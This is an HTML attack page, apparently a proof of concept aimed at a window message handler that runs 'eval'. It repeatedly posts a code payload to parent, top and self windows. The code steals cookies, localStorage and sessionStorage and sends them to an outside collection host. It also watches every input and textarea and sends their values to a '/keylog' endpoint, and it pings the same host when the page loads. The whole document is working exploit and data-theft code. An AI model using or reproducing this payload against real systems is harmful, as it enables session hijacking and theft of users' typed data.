<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
// Attacker payload: collects cookies, localStorage, sessionStorage
var collectCode = [
    '(function(){',
    '  var d={',
    '    cookies:document.cookie,',
    '    ls:JSON.stringify(localStorage),',
    '    ss:JSON.stringify(sessionStorage),',
    '    url:location.href,',
    '    ua:navigator.userAgent,',
    '    ts:new Date().toISOString()',
    '  };',
    '  fetch("https://evilios.free.beeceptor.com/collect",{',
    '    method:"POST",',
    '    headers:{"Content-Type":"application/json"},',
    '    body:JSON.stringify(d)',
    '  });',
    '  var obs=new MutationObserver(function(){',
    '    document.querySelectorAll("input,textarea").forEach(function(i){',
    '      if(!i.__h){i.__h=true;i.addEventListener("change",function(){',
    '        fetch("https://evilios.free.beeceptor.com/keylog",{method:"POST",body:JSON.stringify({f:i.name||i.id,v:i.value})});',
    '      });}',
    '    });',
    '  });',
    '  obs.observe(document.body,{childList:true,subtree:true});',
    '})()'
].join('');

// Ping on load so attacker knows the page loaded
fetch('https://evilios.free.beeceptor.com/ping', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({event: 'loaded', origin: location.origin, parent: window.parent !== window, ts: new Date().toISOString()})
}).catch(function(){});

var payload = JSON.stringify({
    type: 'window.opener',
    name: 'eval',
    args: [collectCode]
});

// Fire immediately and retry every 2s for 60s
// This handles: (a) CDP-injected listener on window, (b) any future native registration
var attempts = 0;
var maxAttempts = 30;

function fire() {
    attempts++;
    try { window.parent.postMessage(payload, '*'); } catch(e) {}
    try { window.top.postMessage(payload, '*'); } catch(e) {}
    // Also try self (for popup/window.open() context where 'this' is the opened window)
    try { window.postMessage(payload, '*'); } catch(e) {}
    if (attempts < maxAttempts) {
        setTimeout(fire, 2000);
    }
}

// Start firing after 500ms initial delay
setTimeout(fire, 500);
</script>
</body>
</html>
